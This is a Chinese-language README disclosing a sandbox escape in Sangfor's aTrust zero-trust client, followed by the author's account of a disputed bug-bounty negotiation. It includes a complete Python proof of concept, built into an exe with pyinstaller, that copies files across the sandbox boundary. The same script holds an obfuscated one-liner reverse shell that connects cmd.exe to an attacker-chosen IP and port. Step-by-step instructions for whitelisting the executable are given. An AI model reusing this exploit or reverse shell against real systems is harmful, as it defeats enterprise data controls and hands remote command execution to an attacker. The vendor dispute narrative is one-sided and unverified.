# SXF_aTrust_sandbox_bypass
深信服零信任沙箱逃逸( 正常功能，所以我也不打算再提交CNVD, 给使用这款产品的用户介绍下这个神奇的功能效果 ）


# 一、功能介绍
* 环境：鹏程众测
* 类型：sandbox bypass
* 危害：无，正常业务功能罢了
* 权限：登陆后

## 1. 将如下py编译为exe
```python
import string
import random

def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in range(length))

def readanyfile(filepath):
    with open(filepath,"rb") as f:
        contentbytes = f.read()
    print(contentbytes)
    return contentbytes

def writeanyfile(filepath, contentbytes):
    contentbytes = contentbytes
    with open(filepath,"wb") as f:
        f.write(contentbytes)

def reverseshell(ip,port):
    try:
        (lambda __y, __g, __contextlib: [[[[[[[(s.connect((ip, port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))
    except:
        pass


def main():
    c = input("[1] 文件逃逸 [2] 反弹shell [3]退出:\n")
    if c == "1":
        print("[1-1] 验证：数据进入沙箱")
        in_sand = input("沙箱内文件路径:\n")
        writeanyfile(in_sand, "flag_{}_".format(random_string(20)).encode())
        print("请确认沙箱内{}文件写入flag\n\n".format(in_sand))
        
        print("[1-2]验证：数据出沙箱")
        out_sand = input("沙箱外文件路径:\n")
        writeanyfile(out_sand,readanyfile(in_sand))
        print("请确认沙箱外{}文件与沙箱内文件数据一致\n\n".format(out_sand))
    elif c == "2":
        ip = input("IP:\n")
        port = input("PORT:\n")
        reverseshell(ip,int(port))
    elif c=="3":
        exit()

while True:
    main()
```

pyinstaller -F taoyi_yanshi.py

## 2. 在安装名单配置上编译出的taoyi_yanshi.exe
功能名称是: 程序安装白名单

功能描述是(此处一字不漏): 此功能可用于无痕模式时保护数据不被自动清除；也可用于解决程序在工作空间安装后使用异常问题(名单内的安装包在工作空间安装时，释放的文件会落盘到个人空间，安装完成后程序产生的数据会落盘到工作空间，即程序安装在个人空间，但运行仍在工作空间)

你可能会好奇，在登录后台有专门一页可以配置安全策略，如'文件导入导出控制'，'剪切板拷贝控制'等，那儿不是配置安全策略的？
想多了，根本不需要那么复杂，配置安装名单比配置策略好用多了，而且其可以让安全策略完全失效，毕竟哪位睿智能想到避免清空数据的功能可以穿越沙箱。
是的，不要怀疑自己，就是这么牛逼。


## 3. 效果
* 程序可以沙箱内外任意写
* 程序落地数据，明文可读
![](1.png)
![](2.png)

# 二、交涉过程
* 5.10 发现问题
* 5.14 沟通情况，电话说需证明反弹shell
* 5.18 提交漏洞详情，证明反弹shell
* 5.20-5.30 争议
* 5.30 发群里仲裁
（补图）
* 5.30 - 6.10 说价格不合适，现在是讨论价格？是你们压根不认为是漏洞，要吃掉吧，然后不回消息
（补图）


群里如何看待本问题？

就一个WeiAi说了看法，什么成分我不知道，但是郑就认为一个人说的话就决定了。 晚点补图

为什么不让小团体仲裁？

赛博大佬说用github 都是卖国的，小心赛博大佬黑了你们。补图

